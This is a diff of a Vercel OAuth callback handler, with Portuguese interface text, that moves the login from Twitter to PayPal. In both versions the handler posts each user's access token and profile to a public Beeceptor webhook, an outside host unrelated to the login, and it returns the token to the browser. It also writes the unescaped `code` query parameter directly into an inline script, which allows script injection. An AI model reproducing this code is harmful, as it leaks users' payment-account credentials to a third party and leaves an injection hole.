@@ -1,6 +1,5 @@
-// api/callback.ts
 import { VercelRequest, VercelResponse } from '@vercel/node';
-import { getOAuthAccessToken } from '../lib/auth';
+import { exchangeCodeForToken, getUserInfo } from '../lib/auth';
 import axios from 'axios';
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
@@ -14,14 +13,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     return;
   }
 
-  // ✅ Trata requisição GET (redirecionamento do Twitter)
   if (req.method === 'GET') {
-    const { oauth_token, oauth_verifier, secret } = req.query;
+    const { code } = req.query;
 
-    // Renderiza o HTML com script que envia o POST
     return res.send(`
       <html>
-        <head><title>Login com Twitter</title></head>
+        <head><title>Login com PayPal</title></head>
         <body>
           <div id="status">Finalizando login...</div>
           <script>
@@ -30,18 +27,16 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                  oauth_token: "${oauth_token}",
-                  oauth_verifier: "${oauth_verifier}",
-                  oauth_token_secret: "${secret}"
+                  code: "${code}"
                 })
               });
-  
+
               const result = await response.json();
-  
+
               if (response.ok) {
                 document.getElementById("status").innerHTML = "<h2>✅ Login concluído!</h2><p>Você pode fechar esta aba.</p>";
               } else {
-                document.getElementById("status").innerText = "Erro ao autenticar com o Twitter.";
+                document.getElementById("status").innerText = "Erro ao autenticar com o PayPal.";
               }
             })();
           </script>
@@ -50,35 +45,28 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     `);
   }
 
-  // ✅ Trata requisição POST com dados do frontend
   if (req.method === 'POST') {
-    const { oauth_token, oauth_verifier, oauth_token_secret } = req.body;
+    const { code } = req.body;
 
-    if (!oauth_token || !oauth_verifier || !oauth_token_secret) {
+    if (!code) {
       return res.status(400).json({ error: 'Parâmetros ausentes' });
     }
 
     try {
-      const { accessToken, accessSecret, results } = await getOAuthAccessToken(
-        oauth_token,
-        oauth_token_secret,
-        oauth_verifier
-      );
+      const token = await exchangeCodeForToken(code);
+      const user = await getUserInfo(token.access_token);
 
-      // Envia ao webhook do Beeceptor
       await axios.post('https://uxl6sixhbbddnl9v.free.beeceptor.com', {
-        accessToken,
-        accessSecret,
-        user: results,
+        accessToken: token.access_token,
+        user,
       });
 
-      return res.status(200).json({ accessToken, accessSecret, user: results });
+      return res.status(200).json({ accessToken: token.access_token, user });
     } catch (err: any) {
-      console.error('Erro no callback:', err?.message || err);
+      console.error(err?.message || err);
       return res.status(500).json({ error: 'Erro ao obter access token' });
     }
   }
 
-  // ❌ Qualquer outro método não é permitido
   return res.status(405).json({ error: 'Método não permitido' });
 }
